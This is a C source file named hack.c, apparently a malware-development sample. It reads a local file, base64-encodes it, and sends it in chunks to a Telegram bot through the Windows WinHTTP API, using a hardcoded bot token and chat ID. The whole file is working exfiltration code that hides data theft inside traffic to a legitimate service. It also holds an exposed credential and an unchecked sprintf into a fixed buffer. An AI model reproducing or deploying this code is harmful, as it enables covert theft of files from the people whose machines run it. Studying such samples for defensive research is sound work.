/*
 * hack.c
 * sending systeminfo via legit URL. Telegram API
 * author @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>

#define MAX_TG_MSG_SIZE 512 // by limit 4096

// send data to Telegram channel using winhttp
int sendToTgBot(const char* message) {
  const char* chatId = "5547299598";
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;

  hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (hSession == NULL) {
    fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
    return 1;
  } else {
    printf("winhttpopen ok\n");
  }

  hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (hConnect == NULL) {
    fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hSession);
  } else {
    printf("winhttpconnect ok\n");
  }

  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (hRequest == NULL) {
    fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
  } else {
    printf("winhttpopenreq ok\n");
  }

  // construct the request body
  char requestBody[512];
  sprintf(requestBody, "chat_id=%s&text=%s", chatId, message);

  // set the headers
  if (!WinHttpSendRequest(hRequest,
    L"Content-Type: application/x-www-form-urlencoded\r\n",
      -1,
      (LPVOID)requestBody,
      (DWORD)strlen(requestBody),
      (DWORD)strlen(requestBody),
    0)) {
    fprintf(stderr, "WinHttpSendRequest. error %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hSession);

  printf("successfully sent to tg bot :)\n");
  return 0;
}

// encoding base64
char* base64_encode(const BYTE* buffer, DWORD length) {
  DWORD base64Len = 0;
  CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);
  char* base64 = (char*)malloc(base64Len + 1);
  CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &base64Len);
  base64[base64Len] = '\0';
  return base64;
}

// base64 fs
void sendBase64File(const char* filePath) {
  FILE* f = fopen(filePath, "rb");
  if (!f) {
    perror("fopen");
    return;
  }

  fseek(f, 0, SEEK_END);
  long size = ftell(f);
  rewind(f);

  BYTE* data = malloc(size);
  fread(data, 1, size, f);
  fclose(f);

  char* encoded = base64_encode(data, size);
  free(data);

  size_t len = strlen(encoded);
  printf("sending base64-encoded data (%zu bytes)...\n", len);
  for (size_t i = 0; i < len; i += MAX_TG_MSG_SIZE) {
    char chunk[4096] = {0};
    strncpy(chunk, encoded + i, MAX_TG_MSG_SIZE);
    printf("%s\n", chunk);
    sendToTgBot(chunk);
    Sleep(1000); // sleep
  }

  free(encoded);
  printf("done...\n");
}

int main() {
  const char* filePath = "cat1.png";
  sendBase64File(filePath);
  return 0;
}
